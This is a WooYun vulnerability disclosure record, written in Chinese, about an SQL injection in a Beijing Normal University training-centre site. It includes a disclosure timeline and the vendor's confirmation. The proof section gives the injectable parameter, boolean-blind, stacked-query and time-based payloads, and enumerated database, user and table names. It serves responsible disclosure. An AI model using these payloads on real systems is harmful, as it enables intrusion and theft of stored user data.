{"id": 70025, "wybug_id": "wooyun-2015-0136144", "wybug_title": "北京师范大学教育培训中心一处SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Hex", "wybug_date": "2015-08-25 20:01", "wybug_open_date": "2015-10-11 00:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-27：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向公众公开  简要描述： 北京师范大学主站一处SQL注入漏洞 详细说明：  1# 注入点位于北京师范大学教育培训中心\nhttp://**.**.**.**/WebGroup.aspx?tpid=0&classid=85&groupid=59\ngroupid参数存在注入2# 数据库类型\nbanner:---Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) \tApr  2 2010 15:48:46 \tCopyright (c) Microsoft Corporation\tEnterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)---\n3# 9个库\navailable databases [9]:[*] ASPState[*] Bnuedu_New[*] dbwx20141019[*] master[*] model[*] msdb[*] tempdb[*] WowXue[*] wowxue20141206\n4# 当前用户和当前库\ncurrent user:    'bsd_20141230'current database:    'Bnuedu_New'current user is DBA:    True\n5# Bnuedu_New库内容，有500多个用户\nDatabase: Bnuedu_New+------------------------------+---------+| Table                        | Entries |+------------------------------+---------+| dbo.bnuedu_Dynamic           | 26009   || dbo.bnuedu_Content           | 2117    || dbo.V_bnuedu_Content         | 2117    || dbo.bnuedu_Video             | 622     || dbo.V_bnuedu_Video           | 622     || dbo.bnuedu_User              | 540     || dbo.bnuedu_Card              | 538     || dbo.V_bnuedu_Card            | 537     || dbo.bnuedu_UserInfo          | 528     || dbo.V_bnuedu_User            | 486     || dbo.bnuedu_VideoGroup        | 115     || dbo.V_bnuedu_VideoGroup      | 115     || dbo.bnuedu_LiveLesson        | 112     || dbo.bnuedu_Apply             | 48      || dbo.bnuedu_Class             | 31      || dbo.bnuedu_PostGraduateApply | 27      || dbo.bnuedu_WebConfig         | 21      || dbo.bnuedu_Channel           | 16      || dbo.bnuedu_Admin             | 7       || dbo.bnuedu_Resource          | 2       || dbo.V_bnuedu_Resource        | 2       || dbo.bnuedu_PaperAnswer       | 1       |+------------------------------+---------+\n6# 鉴于盲注感人的效率，不浪费时间其他库就没跑了   漏洞证明：  \nPlace: GETParameter: groupid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tpid=0&classid=85&groupid=59 AND 2373=2373    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: tpid=0&classid=85&groupid=59; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tpid=0&classid=85&groupid=59 WAITFOR DELAY '0:0:5'--\n   修复方案：  建议全站检测下，别处应该还有注入   版权声明：转载请注明来源 Hex@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-27 00:00 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给赛尔教育，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}